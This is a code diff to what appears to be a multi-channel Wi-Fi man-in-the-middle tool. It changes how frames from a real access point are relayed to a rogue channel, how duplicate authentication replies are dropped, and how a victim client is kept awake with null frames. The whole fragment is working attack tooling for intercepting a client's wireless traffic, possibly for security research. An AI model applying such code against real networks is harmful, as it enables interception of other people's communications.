@@ -105,7 +105,7 @@ PProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> 
 }
 
 void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
-	// Beacon from real AP - update timestamp
+	// Beacon from real AP - update timestamp, don't forward
 	if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
 		const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
 		if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel.ch_num)
@@ -113,37 +113,29 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
 		return;
 	}
 
-	// AP -> client ?
-	const bool might_forward = client_state.get_mac() == addr1 /*&& client_state.should_forward(*pdu)*/;
-
-	//print
-	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
-		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
-	} else if(might_forward){
-		display_traffic(dot11, "Real channel", " -- MitM ap");
-	}
-
 	// Forward na rogue channel
-	if(might_forward){
-		// Auth(seq=2) from real AP must NOT be forwarded - rogue side already sent a synthetic
-		// Auth(seq=2) in handle_open_auth. Forwarding it triggers a second assoc cycle at the
-		// real AP ("Multiple EAP reauth attempts without 4-way handshake completion").
+	if(client_state.get_mac() == addr1){
+		if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
+			display_traffic(dot11, "Real channel", client_state.get_mac() == addr1 ? " -- MitM'ing" : "");
+			client_state.update_state(ClientState::Target_disconnected);
+		}
+
+		// Auth(seq=2) from real AP must NOT be forwarded
+		// rogue side already sent a synthetic Auth(seq=2) in handle_open_auth
+		// Forwarding it triggers a second assoc cycle at the real AP
+		// ("Multiple EAP reauth attempts without 4-way handshake completion")
 		if(const auto *auth = dot11.find_pdu<Dot11Authentication>(); auth && auth->auth_seq_number() == 2){
 			log(LogLevel::DEBUG, "Real channel: dropping Auth(seq=2) relay to rogue (synthetic already sent)");
 			return;
 		}
-		//client_state.modify_packet(*pdu);
 		send_to_rogue(*pdu);
 	}
-
-	//FIXME this can get forwarded packets from rogue
-	if(dot11.find_pdu<Dot11Deauthentication>())
-		client_state.update_state(ClientState::Target);
 }
 
-void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
+void McMitm::power_mgmt_response_real(HWAddress<6> addr2, const Dot11 &dot11) const{
 	if(dot11.addr1() == ap.get(SK::mac)){ // ->AP
-		// Sleep mode detection for keep wake up
+		// sleep mode detection for keep wake up
+		// encrypted, but still works for wake up TODO source
 		if(dot11.power_mgmt() && client_state.get_mac() == addr2){
 			log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
 			Dot11Data null_frame(ap.get(SK::mac), addr2);
@@ -171,7 +163,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 		return;
 	}
 
-	power_mgmt_response(addr2, *dot11);
+	power_mgmt_response_real(addr2, *dot11);
 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
@@ -184,7 +176,6 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 	if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
 		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
 		// STA -> AP
-		// This can catch packets what are not
 		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
 			client_state.update_state(ClientState::Target_disconnected);
 	} else if(addr2 == ap.get(SK::mac)){ // AP ->
